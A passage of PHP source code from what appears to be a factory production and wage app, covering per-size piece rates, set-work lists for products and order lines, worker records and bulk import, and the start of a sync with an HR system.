        $st = db()->prepare("SELECT part_op_id, size_id, rate FROM zp_op_rate WHERE product_id=?");
        $st->execute([$productId]);
        foreach ($st->fetchAll() as $r) $out[(int)$r['part_op_id']][(int)$r['size_id']] = (float)$r['rate'];
    } catch (Throwable $e) {}
    return $cache[$productId] = $out;
}


/* Replace this product's size rates with exactly what was sent.
   $rows = [['op' => part_op_id, 'size' => size_id, 'rate' => float|null], ...]
   A null or blank rate REMOVES the override, which is how a cell goes back to
   inheriting. Anything not mentioned is left alone, so a grid showing one part
   cannot wipe another part's rates. */
function zp_op_rate_save(int $productId, array $rows, int $userId = 0): array {
    zp_ensure_schema();
    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.', 'set' => 0, 'cleared' => 0];

    /* the standard rate of every operation this product uses, so a cell typed
       back to the standard can be stored as "no override" rather than as a row
       that quietly disconnects that size from the standard for ever */
    $std = [];
    foreach (zp_product_parts($productId) as $p)
        foreach (zp_part_ops((int)$p['id'], false) as $o) $std[(int)$o['id']] = (float)$o['rate'];

    $sizes = [];
    foreach (zp_sizes($productId) as $s) $sizes[(int)$s['id']] = true;

    $set = 0; $cleared = 0;
    try {
        db()->beginTransaction();
        $ins = db()->prepare("INSERT INTO zp_op_rate (product_id, part_op_id, size_id, rate, created_by)
                              VALUES (?,?,?,?,?)
                              ON DUPLICATE KEY UPDATE rate=VALUES(rate), updated_at=NOW()");
        $del = db()->prepare("DELETE FROM zp_op_rate WHERE product_id=? AND part_op_id=? AND size_id=?");
        foreach ($rows as $r) {
            $op = (int)($r['op'] ?? 0); $sz = (int)($r['size'] ?? 0);
            /* an operation this product does not use, or a size it does not
               have, is refused rather than stored — a row nothing can ever read
               is indistinguishable from a bug */
            if ($op <= 0 || !isset($std[$op]) || !isset($sizes[$sz])) continue;
            $raw = $r['rate'] ?? null;
            $blank = ($raw === null || $raw === '' || !is_numeric($raw));
            if ($blank) { $del->execute([$productId, $op, $sz]); $cleared += $del->rowCount(); continue; }
            $val = round((float)$raw, 2);
            if ($val < 0) continue;
            /* TYPING THE STANDARD IS NOT AN OVERRIDE. Storing 5.00 against a
               standard of 5.00 creates a row that does nothing except stop the
               standard from ever reaching this size again — a trap found months
               later, when the standard moves and one size silently does not. */
            if (abs($val - $std[$op]) < 0.0001) { $del->execute([$productId, $op, $sz]); $cleared += $del->rowCount(); continue; }
            $ins->execute([$productId, $op, $sz, $val, $userId ?: null]);
            $set++;
        }
        db()->commit();
    } catch (Throwable $e) {
        if (db()->inTransaction()) db()->rollBack();
        return ['ok' => false, 'error' => 'Nothing was saved. ' . $e->getMessage(), 'set' => 0, 'cleared' => 0];
    }
    zp_op_rate_map(0, true);        // the map just changed; drop the cached copy
    return ['ok' => true, 'error' => '', 'set' => $set, 'cleared' => $cleared];
}

/* WHAT A PIECE ACTUALLY PAYS — most specific wins.
 *
 *   1. this order        zp_order_rates      one PO negotiated differently
 *   2. this size         zp_op_rate          a King seam is longer than a Single
 *   3. the standard      zp_part_ops.rate    what the part normally pays
 *
 * Both override maps empty gives exactly the behaviour this app had before
 * either existed, which is the property that makes them safe to add.
 *
 * The ORDER still beats the SIZE: an amendment on a PO is somebody stating, in
 * writing and with a reason, what that customer's work pays. A product-level
 * size rate is a default. A default does not get to overrule a signed
 * arrangement.
 */
function zp_rate_for(int $opId, float $standard, array $map,
                     array $sizeMap = [], int $sizeId = 0): float {
    if (array_key_exists($opId, $map)) return (float)$map[$opId];
    if ($sizeId > 0 && isset($sizeMap[$opId][$sizeId])) return (float)$sizeMap[$opId][$sizeId];
    return $standard;
}

/* Where a rate came from, for a screen that has to explain itself. */
function zp_rate_source(int $opId, array $map, array $sizeMap = [], int $sizeId = 0): string {
    if (array_key_exists($opId, $map)) return 'order';
    if ($sizeId > 0 && isset($sizeMap[$opId][$sizeId])) return 'size';
    return 'standard';
}

/* ============================================================
   SET WORK — the product's list, and an order line's own copy
   ============================================================ */

/* The jobs this product normally needs doing to a finished set. */
function zp_set_ops(int $productId, bool $activeOnly = true): array {
    zp_ensure_schema();
    if ($productId <= 0) return [];
    try {
        $sql = "SELECT * FROM zp_set_ops WHERE product_id=?"
             . ($activeOnly ? " AND is_active=1" : "") . " ORDER BY seq, id";
        $st = db()->prepare($sql); $st->execute([$productId]);
        return $st->fetchAll();
    } catch (Throwable $e) { return []; }
}

/* Replaces the product's whole list with what was typed.
   $rows = [ ['id','stage_id','operation_name','rate'], ... ] in screen order.

   A ROW THAT DISAPPEARS IS SWITCHED OFF, NOT DELETED. Its id is on every
   wage already booked against it; deleting it would leave those wages
   pointing at nothing and no report could ever explain the gap. Exactly the
   rule zp_save_part_ops() follows, for exactly the same reason. */
function zp_save_set_ops(int $productId, array $rows, ?int $userId = null): array {
    zp_ensure_schema();
    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.'];
    $keep = []; $seq = 0; $clean = [];
    foreach ($rows as $r) {
        $name = trim((string)($r['operation_name'] ?? ''));
        if ($name === '') continue;                     // a blank line is not an operation
        $clean[] = [
            'id'      => (int)($r['id'] ?? 0),
            'stage'   => (int)($r['stage_id'] ?? 0) ?: null,
            'name'    => mb_substr($name, 0, 120),
            'rate'    => round((float)($r['rate'] ?? 0), 2),
            'seq'     => ++$seq,
        ];
    }
    try {
        db()->beginTransaction();
        $ins = db()->prepare("INSERT INTO zp_set_ops (product_id,seq,stage_id,operation_name,rate,is_active)
                              VALUES (?,?,?,?,?,1)");
        $upd = db()->prepare("UPDATE zp_set_ops SET seq=?,stage_id=?,operation_name=?,rate=?,is_active=1
                              WHERE id=? AND product_id=?");
        foreach ($clean as $c) {
            if ($c['id'] > 0) {
                $upd->execute([$c['seq'], $c['stage'], $c['name'], $c['rate'], $c['id'], $productId]);
                $keep[] = $c['id'];
            } else {
                $ins->execute([$productId, $c['seq'], $c['stage'], $c['name'], $c['rate']]);
                $keep[] = (int)db()->lastInsertId();
            }
        }
        if ($keep) {
            $in = implode(',', array_fill(0, count($keep), '?'));
            $st = db()->prepare("UPDATE zp_set_ops SET is_active=0 WHERE product_id=? AND id NOT IN ($in)");
            $st->execute(array_merge([$productId], $keep));
        } else {
            db()->prepare("UPDATE zp_set_ops SET is_active=0 WHERE product_id=?")->execute([$productId]);
        }
        db()->commit();
    } catch (Throwable $e) {
        try { db()->rollBack(); } catch (Throwable $e2) {}
        return ['ok' => false, 'error' => 'Could not save the set work.'];
    }
    return ['ok' => true, 'error' => '', 'saved' => count($clean)];
}

/* ------------------------------------------- the per-size rate, for set work */
function zp_set_rate_map(int $productId): array {
    zp_ensure_schema();
    $out = [];
    if ($productId <= 0) return $out;
    try {
        $st = db()->prepare("SELECT set_op_id, size_id, rate FROM zp_set_op_rate WHERE product_id=?");
        $st->execute([$productId]);
        foreach ($st->fetchAll() as $r) $out[(int)$r['set_op_id']][(int)$r['size_id']] = (float)$r['rate'];
    } catch (Throwable $e) {}
    return $out;
}

/* NO ROW MEANS THE OPERATION'S OWN RATE — the same rule the part rates
   follow, so a blank size cell means "the rate on the left" on both grids. */
function zp_set_rate_for(int $setOpId, float $standard, array $map, int $sizeId): float {
    if ($sizeId > 0 && isset($map[$setOpId][$sizeId])) return (float)$map[$setOpId][$sizeId];
    return $standard;
}

function zp_save_set_rates(int $productId, array $rows, ?int $userId = null): void {
    zp_ensure_schema();
    if ($productId <= 0) return;
    try {
        $del = db()->prepare("DELETE FROM zp_set_op_rate WHERE product_id=? AND set_op_id=? AND size_id=?");
        $ins = db()->prepare("INSERT INTO zp_set_op_rate (product_id,set_op_id,size_id,rate,created_by)
                              VALUES (?,?,?,?,?)
                              ON DUPLICATE KEY UPDATE rate=VALUES(rate), updated_at=NOW()");
        foreach ($rows as $r) {
            $op = (int)($r['set_op_id'] ?? 0); $sz = (int)($r['size_id'] ?? 0);
            if ($op <= 0 || $sz <= 0) continue;
            $raw = trim((string)($r['rate'] ?? ''));
            /* A CLEARED CELL IS NOT A ZERO. Blank means "follow the operation's
               own rate", so the override is removed; writing 0.00 would pay
               nothing for that size and look deliberate. */
            if ($raw === '') { $del->execute([$productId, $op, $sz]); continue; }
            $ins->execute([$productId, $op, $sz, round((float)$raw, 2), $userId]);
        }
    } catch (Throwable $e) {}
}

/* ------------------------------------------------ an order line's own copy */

/* Does this line have its own list? Rows here, of any kind, mean yes. */
function zp_line_has_own_set(int $proformaItemId): bool {
    zp_ensure_schema();
    if ($proformaItemId <= 0) return false;
    try {
        $st = db()->prepare("SELECT COUNT(*) FROM zp_line_set_ops WHERE proforma_item_id=?");
        $st->execute([$proformaItemId]);
        return (int)$st->fetchColumn() > 0;
    } catch (Throwable $e) { return false; }
}

/* Takes the product's list and writes it onto the line, once.
   Refuses if a copy already exists — otherwise pressing the button twice
   would quietly throw away everything typed the first time. */
function zp_line_take_set_copy(int $proformaItemId, int $productId, int $sizeId = 0): array {
    zp_ensure_schema();
    if ($proformaItemId <= 0 || $productId <= 0) return ['ok' => false, 'error' => 'No order line.'];
    if (zp_line_has_own_set($proformaItemId))
        return ['ok' => false, 'error' => 'This line already has its own set work.'];
    $ops = zp_set_ops($productId, true);
    if (!$ops) return ['ok' => false, 'error' => 'This product has no set work to copy yet.'];
    $rates = zp_set_rate_map($productId);
    try {
        $ins = db()->prepare("INSERT INTO zp_line_set_ops
            (proforma_item_id,set_op_id,seq,stage_id,operation_name,rate,is_active) VALUES (?,?,?,?,?,?,1)");
        $seq = 0;
        foreach ($ops as $o) {
            /* THE COPY TAKES THE RATE THIS LINE WOULD ACTUALLY HAVE PAID,
               size override included. Copying the standard rate instead would
               silently re-price every size that had one the moment somebody
               pressed the button. */
            $rate = zp_set_rate_for((int)$o['id'], (float)$o['rate'], $rates, $sizeId);
            $ins->execute([$proformaItemId, (int)$o['id'], ++$seq,
                           $o['stage_id'] !== null ? (int)$o['stage_id'] : null,
                           (string)$o['operation_name'], $rate]);
        }
    } catch (Throwable $e) { return ['ok' => false, 'error' => 'Could not copy the set work.']; }
    return ['ok' => true, 'error' => '', 'copied' => count($ops)];
}

/* Throws the copy away so the line follows the product again. Only safe
   while nothing has been booked against a line that exists here and nowhere
   else — the caller checks that and this says so if it cannot. */
function zp_line_drop_set_copy(int $proformaItemId): array {
    zp_ensure_schema();
    if ($proformaItemId <= 0) return ['ok' => false, 'error' => 'No order line.'];
    try {
        $st = db()->prepare("SELECT COUNT(*) FROM zp_entries e
                             JOIN zp_line_set_ops o ON o.id = e.op_id
                             WHERE e.op_kind='line' AND e.status='active'
                               AND o.proforma_item_id = ? AND o.set_op_id IS NULL");
        $st->execute([$proformaItemId]);
        if ((int)$st->fetchColumn() > 0)
            return ['ok' => false, 'error' => 'Work has already been booked against a job that only exists on this order. '
                . 'Dropping the copy would leave those wages pointing at nothing.'];
        db()->prepare("DELETE FROM zp_line_set_ops WHERE proforma_item_id=?")->execute([$proformaItemId]);
    } catch (Throwable $e) { return ['ok' => false, 'error' => 'Could not drop the copy.']; }
    return ['ok' => true, 'error' => ''];
}

/* THE ONE ANSWER TO "WHAT SET WORK DOES THIS LINE NEED?"
 *
 * Every screen asks this — the order form, Daily Entry, Assembly, Costing —
 * so the choice between the product's list and the line's own copy is made
 * HERE and nowhere else. A screen that decided it for itself would be the
 * one that disagrees.
 *
 * Each row carries `kind`, which is what zp_entries.op_kind must be set to
 * when work is booked against it, and `from` so a screen can say where the
 * row came from without working it out again. */
function zp_line_set_work(int $proformaItemId, int $productId, int $sizeId = 0): array {
    zp_ensure_schema();
    $out = [];
    if ($proformaItemId > 0 && zp_line_has_own_set($proformaItemId)) {
        try {
            $st = db()->prepare("SELECT * FROM zp_line_set_ops WHERE proforma_item_id=? AND is_active=1 ORDER BY seq, id");
            $st->execute([$proformaItemId]);
            foreach ($st->fetchAll() as $r) {
                $out[] = [
                    'id'    => (int)$r['id'],
                    'kind'  => 'line',
                    'from'  => $r['set_op_id'] !== null ? 'product' : 'added',
                    'set_op_id' => $r['set_op_id'] !== null ? (int)$r['set_op_id'] : 0,
                    'stage_id'  => (int)($r['stage_id'] ?? 0),
                    'name'  => (string)$r['operation_name'],
                    'rate'  => (float)$r['rate'],
                ];
            }
        } catch (Throwable $e) {}
        return $out;
    }
    $rates = zp_set_rate_map($productId);
    foreach (zp_set_ops($productId, true) as $o) {
        $out[] = [
            'id'    => (int)$o['id'],
            'kind'  => 'set',
            'from'  => 'product',
            'set_op_id' => (int)$o['id'],
            'stage_id'  => (int)($o['stage_id'] ?? 0),
            'name'  => (string)$o['operation_name'],
            'rate'  => zp_set_rate_for((int)$o['id'], (float)$o['rate'], $rates, $sizeId),
        ];
    }
    return $out;
}

/* What one set of this product costs in set work, at one size. Costing reads
   this; a set used to be priced on part work alone. */
function zp_set_work_cost(int $productId, int $sizeId = 0): float {
    $t = 0.0;
    foreach (zp_line_set_work(0, $productId, $sizeId) as $r) $t += (float)$r['rate'];
    return round($t, 2);
}

/* Saves an order line's own list, in screen order.
   $rows = [ ['id','set_op_id','stage_id','operation_name','rate','off'], ... ]
   A row marked off is kept and switched off — see the table comment. */
function zp_save_line_set_ops(int $proformaItemId, array $rows): array {
    zp_ensure_schema();
    if ($proformaItemId <= 0) return ['ok' => false, 'error' => 'No order line.'];
    try {
        db()->beginTransaction();
        $keep = [];
        $ins = db()->prepare("INSERT INTO zp_line_set_ops
            (proforma_item_id,set_op_id,seq,stage_id,operation_name,rate,is_active) VALUES (?,?,?,?,?,?,?)");
        $upd = db()->prepare("UPDATE zp_line_set_ops SET seq=?,stage_id=?,operation_name=?,rate=?,is_active=?
                              WHERE id=? AND proforma_item_id=?");
        $seq = 0;
        foreach ($rows as $r) {
            $name = trim((string)($r['operation_name'] ?? ''));
            if ($name === '') continue;
            $seq++;
            $stage = (int)($r['stage_id'] ?? 0) ?: null;
            $rate  = round((float)($r['rate'] ?? 0), 2);
            $on    = empty($r['off']) ? 1 : 0;
            $id    = (int)($r['id'] ?? 0);
            if ($id > 0) {
                $upd->execute([$seq, $stage, mb_substr($name, 0, 120), $rate, $on, $id, $proformaItemId]);
                $keep[] = $id;
            } else {
                $sop = (int)($r['set_op_id'] ?? 0) ?: null;
                $ins->execute([$proformaItemId, $sop, $seq, $stage, mb_substr($name, 0, 120), $rate, $on]);
                $keep[] = (int)db()->lastInsertId();
            }
        }
        /* Anything the screen did not send back is switched off, not deleted —
           the same rule, so a row can always be put back with the ↩. */
        if ($keep) {
            $in = implode(',', array_fill(0, count($keep), '?'));
            $st = db()->prepare("UPDATE zp_line_set_ops SET is_active=0
                                 WHERE proforma_item_id=? AND id NOT IN ($in)");
            $st->execute(array_merge([$proformaItemId], $keep));
        }
        db()->commit();
    } catch (Throwable $e) {
        try { db()->rollBack(); } catch (Throwable $e2) {}
        return ['ok' => false, 'error' => 'Could not save the set work for this order.'];
    }
    return ['ok' => true, 'error' => ''];
}

/* HAS THE PRODUCT'S LIST MOVED SINCE THIS COPY WAS TAKEN?
   A copy is a copy and never follows the master — but it must never go quiet
   about it either. Returns the product's active jobs that this line's copy
   has never heard of. */
function zp_line_set_drift(int $proformaItemId, int $productId): array {
    if (!zp_line_has_own_set($proformaItemId)) return [];
    $mine = [];
    try {
        $st = db()->prepare("SELECT set_op_id FROM zp_line_set_ops WHERE proforma_item_id=? AND set_op_id IS NOT NULL");
        $st->execute([$proformaItemId]);
        foreach ($st->fetchAll() as $r) $mine[(int)$r['set_op_id']] = true;
    } catch (Throwable $e) { return []; }
    $new = [];
    foreach (zp_set_ops($productId, true) as $o)
        if (!isset($mine[(int)$o['id']])) $new[] = $o;
    return $new;
}

/* ============================================================
   WORKERS
   ============================================================ */
function zp_workers(bool $activeOnly = false): array {
    zp_ensure_schema();
    $sql = "SELECT * FROM zp_workers" . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY worker_name";
    try { return db()->query($sql)->fetchAll(); } catch (Throwable $e) { return []; }
}

/* How long a worker code may be. One number, in one place, read by the
   save, by the paste grid, by the HR sync and by the two boxes on screen —
   so they cannot disagree about what will be accepted. */
const ZP_CODE_MAX = 40;

function zp_save_worker(int $id, string $code, string $name, ?string $dept, int $active): array {
    zp_ensure_schema();
    $code = strtoupper(trim($code));
    $name = trim($name);
    /* REFUSED HERE, NOT TRUNCATED BY THE DATABASE. A code that is cut down
       to fit is a different person's code, and nothing on any screen would
       ever say so. */
    if (mb_strlen($code) > ZP_CODE_MAX)
        return ['ok' => false, 'id' => 0, 'error' => 'The code "' . $code . '" is '
              . mb_strlen($code) . ' characters — longer than the ' . ZP_CODE_MAX
              . ' this app stores. Shorten it, or tell me and I will widen the column.'];
    $dept = ($dept === null || trim($dept) === '') ? null : trim($dept);
    if ($name === '') return ['ok' => false, 'id' => 0, 'error' => 'Worker name is required.'];
    if ($code === '') {
        /* A CODE IS GIVEN, NOT DEMANDED. Asking a data-entry clerk to invent a
           unique code for 200 workers is how you get W1, w1 and W01 for the
           same person. W001 upward, derived from what is already there. */
        try {
            $n = (int)db()->query("SELECT COUNT(*) FROM zp_workers")->fetchColumn();
        } catch (Throwable $e) { $n = 0; }
        do {
            $n++;
            $code = 'W' . str_pad((string)$n, 3, '0', STR_PAD_LEFT);
            $c = db()->prepare("SELECT COUNT(*) FROM zp_workers WHERE worker_code=?");
            $c->execute([$code]);
        } while ((int)$c->fetchColumn() > 0 && $n < 100000);
    }
    $dup = db()->prepare("SELECT id FROM zp_workers WHERE worker_code=? AND id<>?");
    $dup->execute([$code, $id]);
    if ($dup->fetchColumn()) return ['ok' => false, 'id' => 0, 'error' => 'Code "' . $code . '" already belongs to another worker.'];

    if ($id > 0) {
        db()->prepare("UPDATE zp_workers SET worker_code=?, worker_name=?, department=?, is_active=? WHERE id=?")
            ->execute([$code, $name, $dept, $active ? 1 : 0, $id]);
        return ['ok' => true, 'id' => $id, 'error' => ''];
    }
    db()->prepare("INSERT INTO zp_workers (worker_code, worker_name, department, is_active) VALUES (?,?,?,?)")
        ->execute([$code, $name, $dept, $active ? 1 : 0]);
    return ['ok' => true, 'id' => (int)db()->lastInsertId(), 'error' => ''];
}

/* ---------------------------------------- which stages a worker works */

/* EVERY worker's allotment in one query, not one query per worker.
   [worker_id => [stage_id, stage_id, ...]]. A worker with nothing allotted is
   simply absent from the map, and absent means EVERY stage — see
   zp_worker_does_stage() below, which is the only place that is decided. */
function zp_worker_stage_map(): array {
    zp_ensure_schema();
    $out = [];
    try {
        foreach (db()->query("SELECT worker_id, stage_id FROM zp_worker_stage")->fetchAll() as $r)
            $out[(int)$r['worker_id']][] = (int)$r['stage_id'];
    } catch (Throwable $e) {}
    return $out;
}

function zp_worker_stages(int $workerId): array {
    return zp_worker_stage_map()[$workerId] ?? [];
}

/* THE ONE RULE, STATED ONCE.
   Nothing allotted = available for everything. This is what keeps the whole
   feature additive: an empty table behaves exactly as the app did before it
   existed. Every screen asks this function rather than testing in_array
   itself, so no screen can drift into hiding people. */
function zp_worker_does_stage(array $map, int $workerId, int $stageId): bool {
    $mine = $map[$workerId] ?? [];
    if (!$mine) return true;                  // not allotted = anywhere
    if ($stageId <= 0) return true;           // an operation with no stage asks nobody to prove anything
    return in_array($stageId, $mine, true);
}

/* Replaces a worker's allotment with exactly what was ticked.
   An empty list is a legitimate answer — it puts the worker back to "any
   stage" — so this deletes first and only then inserts. Unknown stage ids are
   dropped rather than refused: a stage removed while the form was open should
   not cost somebody their other five ticks. */
function zp_save_worker_stages(int $workerId, array $stageIds): void {
    zp_ensure_schema();
    if ($workerId <= 0) return;
    $valid = [];
    foreach (zp_stage_all(false) as $s) $valid[(int)$s['id']] = true;
    $want = [];
    foreach ($stageIds as $sid) { $sid = (int)$sid; if ($sid > 0 && isset($valid[$sid])) $want[$sid] = true; }
    try {
        db()->prepare("DELETE FROM zp_worker_stage WHERE worker_id=?")->execute([$workerId]);
        if ($want) {
            $ins = db()->prepare("INSERT INTO zp_worker_stage (worker_id, stage_id) VALUES (?,?)");
            foreach (array_keys($want) as $sid) $ins->execute([$workerId, $sid]);
        }
    } catch (Throwable $e) {}
}

/* ============================================================
   MANY WORKERS AT ONCE — pasted out of Excel
   ============================================================

   Three hundred people were being typed in one at a time. A block pasted
   from a spreadsheet arrives as rows of [code, name, department, stages].

   NOTHING IS WRITTEN UNTIL EVERY ROW PASSES, which is the same rule
   zp_book() follows and for the same reason: a half-saved sheet is worse
   than a refused one. You cannot tell which half went in, and pasting it
   again to be sure creates every worker in that half twice. A refusal names
   the row and the reason, the sheet stays on screen, and one correction
   fixes it.

   WHAT REFUSES A ROW, AND WHAT ONLY WARNS:

     no name                 refuses — a worker is their name
     a code already in use   refuses, naming who has it
     the same code twice
       inside the paste      refuses — the second would overwrite the first
     a stage that matches
       nothing               refuses, naming it. A typo would otherwise
                             leave that person on EVERY stage, which is the
                             widest setting there is and the opposite of
                             what was meant.
     a name already on
       the list              WARNS only. Two Muhammad Aslams on a floor of
                             three hundred is ordinary, and refusing it
                             would make the honest case impossible.
*/
function zp_import_workers(array $rows): array {
    zp_ensure_schema();
    $stages = [];
    foreach (zp_stage_all(false) as $s) $stages[mb_strtolower(trim($s['name']))] = (int)$s['id'];

    $have = [];   // code => name, as the list stands now
    $names = [];
    foreach (zp_workers(false) as $w) {
        $have[mb_strtoupper(trim((string)$w['worker_code']))] = (string)$w['worker_name'];
        $names[mb_strtolower(trim((string)$w['worker_name']))] = true;
    }

    $errors = []; $warn = []; $ready = []; $seen = [];
    foreach ($rows as $i => $r) {
        $line = 'Row ' . ($i + 1);
        $code = mb_strtoupper(trim((string)($r['code'] ?? '')));
        $name = trim(preg_replace('/\s+/', ' ', (string)($r['name'] ?? '')));
        $dept = trim(preg_replace('/\s+/', ' ', (string)($r['dept'] ?? '')));
        $stxt = trim((string)($r['stages'] ?? ''));

        /* A ROW WITH NOTHING ON IT IS NOT A MISTAKE. A pasted block almost
           always carries a trailing blank line, and refusing the sheet for
           it would be maddening. */
        if ($code === '' && $name === '' && $dept === '' && $stxt === '') continue;

        if ($name === '') { $errors[] = "$line: there is no name."; continue; }
        if (mb_strlen($name) > 120) $name = mb_substr($name, 0, 120);
        if (mb_strlen($dept) > 60)  $dept = mb_substr($dept, 0, 60);

        if ($code !== '') {
            if (mb_strlen($code) > ZP_CODE_MAX) { $errors[] = "$line: the code \"$code\" is longer than " . ZP_CODE_MAX . " characters."; continue; }
            if (isset($have[$code])) { $errors[] = "$line: code $code already belongs to " . $have[$code] . "."; continue; }
            if (isset($seen[$code])) { $errors[] = "$line: code $code is used twice in this paste (also row " . $seen[$code] . ")."; continue; }
            $seen[$code] = $i + 1;
        }

        /* Stages separated by a comma, a slash, a semicolon or a pipe —
           whichever the spreadsheet happened to use. */
        $sids = []; $bad = [];
        foreach (preg_split('/[,\/;|]+/', $stxt) as $bit) {
            $bit = trim($bit);
            if ($bit === '') continue;
            $k = mb_strtolower($bit);
            if (isset($stages[$k])) $sids[] = $stages[$k];
            else $bad[] = $bit;
        }
        if ($bad) {
            $errors[] = "$line: no stage is called \"" . implode('", "', $bad) . "\". "
                      . ($stages ? 'The stages are: ' . implode(', ', array_map(
                            fn($s) => $s['name'], zp_stage_all(false))) . '.'
                                 : 'No stages have been set up yet.');
            continue;
        }

        if (isset($names[mb_strtolower($name)])) $warn[] = $name;
        $ready[] = ['code' => $code, 'name' => $name, 'dept' => $dept !== '' ? $dept : null, 'stages' => $sids];
    }

    if ($errors) return ['ok' => false, 'errors' => $errors, 'saved' => 0, 'warn' => []];
    if (!$ready)  return ['ok' => false, 'errors' => ['There is nothing to add — every row is empty.'], 'saved' => 0, 'warn' => []];

    $saved = 0;
    try {
        db()->beginTransaction();
        foreach ($ready as $w) {
            /* zp_save_worker is reused rather than re-implemented: it is what
               gives a blank code the next free W-number, and it is the only
               place that rule should live. */
            $r = zp_save_worker(0, $w['code'], $w['name'], $w['dept'], 1);
            if (!$r['ok']) throw new RuntimeException($r['error']);
            if ($w['stages']) zp_save_worker_stages((int)$r['id'], $w['stages']);
            $saved++;
        }
        db()->commit();
    } catch (Throwable $e) {
        try { db()->rollBack(); } catch (Throwable $e2) {}
        return ['ok' => false, 'saved' => 0, 'warn' => [],
                'errors' => ['Nothing was added — the database refused the sheet. ' . $e->getMessage()]];
    }
    return ['ok' => true, 'errors' => [], 'saved' => $saved, 'warn' => array_values(array_unique($warn))];
}

/* A WORKER WITH WAGES IS NEVER DELETED. Their name is on every entry they were
   paid for; removing the row would leave those wages belonging to nobody. */
/* WHAT STOPS A WORKER BEING DELETED IS MONEY, NOT HISTORY.
   ========================================================

   The rule was "any entry at all keeps them", and he found the hole in it:

     "i entered production but later deleted production so if not active
      production and any payment so then please allow delete"

   He is right. This counted EVERY row in zp_entries, cancelled ones
   included. So a worker entered by mistake, given one test entry, and then
   corrected by cancelling that entry, could never be removed — the app
   pointed at a cancelled entry as its reason, which is to say at nothing.
   Wages are the `amount` on an ACTIVE entry; a cancelled entry carries no
   money, by definition, because cancelling it is how money is taken back.

   So the test is ACTIVE entries only.

     any active entry     kept, set inactive. Their name is on wages that
                          were really paid and must stay readable forever.
     only cancelled ones  deleted, and the cancelled rows go with them —
                          left behind they would point at a worker who no
                          longer exists, and a name that cannot be looked
                          up is worse than a row that is gone. The message
                          says how many went, so nothing disappears quietly.
     nothing at all       deleted, as before. */
function zp_delete_worker(int $id): array {
    zp_ensure_schema();

    $a = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE worker_id=? AND status='active'");
    $a->execute([$id]);
    $active = (int)$a->fetchColumn();

    if ($active > 0) {
        db()->prepare("UPDATE zp_workers SET is_active=0 WHERE id=?")->execute([$id]);
        return ['ok' => true, 'deleted' => false,
                'msg' => 'That worker has ' . number_format($active) . ' live production entr'
                       . ($active === 1 ? 'y' : 'ies') . ' against their name, so they have been set '
                       . 'inactive instead of deleted. Every wage they were paid keeps their name on it. '
                       . 'Cancel those entries first if they were entered by mistake, and then this '
                       . 'worker can be deleted.'];
    }

    $c = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE worker_id=? AND status<>'active'");
    $c->execute([$id]);
    $cancelled = (int)$c->fetchColumn();

    db()->beginTransaction();
    try {
        if ($cancelled > 0) db()->prepare("DELETE FROM zp_entries WHERE worker_id=? AND status<>'active'")->execute([$id]);
        db()->prepare("DELETE FROM zp_workers WHERE id=?")->execute([$id]);
        /* The allotment goes with them. Left behind it would silently re-attach
           itself to whoever next took that auto-increment id. */
        db()->prepare("DELETE FROM zp_worker_stage WHERE worker_id=?")->execute([$id]);
        db()->commit();
    } catch (Throwable $e) {
        db()->rollBack();
        return ['ok' => false, 'deleted' => false,
                'msg' => 'Nothing was deleted. ' . $e->getMessage()];
    }

    return ['ok' => true, 'deleted' => true,
            'msg' => $cancelled > 0
                ? 'Worker deleted. They had no live production — the ' . number_format($cancelled)
                  . ' cancelled entr' . ($cancelled === 1 ? 'y was' : 'ies were')
                  . ' removed with them, since a cancelled entry carries no wage.'
                : 'Worker deleted — they had no entries.'];
}

/* ============================================================
   THE HR APP IS THE MASTER LIST OF PEOPLE
   ============================================================

   Asked for in his words:
     "use my this token key to get exact production_workers.php as update
      button on this page ... let department also save into system as it as
      well stage i will manual edit easily one by one ... if any id or
      worker removed so you do not remove here even if its started job
      somewhere but give me alert ... if add some worker with new ids name
      and department so add easily same way and tell me only that adding
      new simple alert msg"

   THE RULES, AND THEY ARE HIS, NOT MINE:

     EMPNO IS THE PERSON.  Matched against worker_code. Not the name — two
     people share a name, and a name is the thing most likely to be
     re-typed. The employee number is what HR guarantees.

     NEW PEOPLE ARE ADDED.  Code, name and department, exactly as HR spells
     them. Reported by name so he can see who arrived.

     NAMES AND DEPARTMENTS ARE FOLLOWED.  HR owns those two facts; when
     they change there, they change here, and every change is listed.

     STAGES ARE NEVER TOUCHED.  "stage i will manual edit easily one by
     one." A sync that reset stage allotments would undo an afternoon's
     work every time it ran, and would do it silently.

     NOBODY IS EVER REMOVED.  Not deactivated either. A worker who has left
     HR may still have unpaid wages, a half-finished bundle on the floor, or
     an entry booked this morning. They are REPORTED — never touched. That
     is the difference between a sync and a wrecking ball, and he asked for
     it explicitly.

   THE TOKEN IS NOT IN THIS FILE. It lives in zp_meta, set once from the
   screen, and it is never printed back in full — the same rule as the
   Redis password. It is also sent over plain http to that portal, which is
   his network's decision, not something this code can fix; the screen says
   so once rather than pretending otherwise. */

function zp_hr_url(): string   { return trim(zp_meta_get('hr_url')); }
function zp_hr_token(): string { return trim(zp_meta_get('hr_token')); }
function zp_hr_configured(): bool { return zp_hr_url() !== '' && zp_hr_token() !== ''; }

/* Enough to recognise it, never enough to use it. */
function zp_hr_token_masked(): string {
    $t = zp_hr_token();
    if ($t === '') return '';
    return str_repeat('•', 8) . mb_substr($t, -3);
}

function zp_hr_save_settings(string $url, string $token): array {
    $url = trim($url);
    if ($url !== '' && !preg_match('~^https?://~i', $url))
        return ['ok' => false, 'error' => 'The address must start with http:// or https://'];
    zp_meta_set('hr_url', $url);
    /* A BLANK TOKEN MEANS "LEAVE IT ALONE", not "erase it". The box on
       screen shows a mask, and saving the form with the mask still in it
       must not overwrite the real token with dots. */
    $token = trim($token);
    if ($token !== '' && strpos($token, '•') === false) zp_meta_set('hr_token', $token);
    return ['ok' => true, 'error' => ''];
}

/* Read the list of people out of the HR app.
   Returns ['ok'=>bool, 'rows'=>[['code','name','dept'], ...], 'error'=>string]. */
function zp_hr_fetch(): array {
    if (!zp_hr_configured())
        return ['ok' => false, 'rows' => [], 'error' => 'The HR address and token are not set yet.'];

    $ctx = stream_context_create(['http' => [
        'method'        => 'GET',
        'header'        => "Authorization: Bearer " . zp_hr_token() . "\r\nAccept: application/json\r\n",
        'timeout'       => 120,
        'ignore_errors' => true,          // read the body of a 401 as well, to report it
    ]]);
    $body = @file_get_contents(zp_hr_url(), false, $ctx);
    $code = 0;
